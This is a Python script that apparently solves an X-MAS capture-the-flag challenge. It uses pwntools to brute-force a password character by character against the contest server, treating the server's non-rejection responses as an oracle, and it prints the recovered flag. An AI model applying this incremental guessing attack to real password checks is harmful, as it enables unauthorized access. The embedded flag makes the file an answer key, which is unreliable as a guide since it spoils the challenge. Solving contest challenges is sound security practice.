from pwn import remote, PwnlibException
from utils.flag_strings import leet_flag_chars_upper as chars

# flag = "X-MAS{"
flag = "X-MAS{S1D3CH4NN3LZ?wtf!!!}"

while flag[-1] != '}':
    for char in chars:
        while True:
            try:
                r = remote("challs.xmas.htsp.ro", 5051)
                break
            except PwnlibException:
                pass
        r.recvuntil("PLEASE INPUT PASSWORD:\n")
        r.sendline(flag + char)
        resp = r.recvall()
        if b"REJECTED" not in resp:
            flag += char
            print("FLAG:", flag)
            break
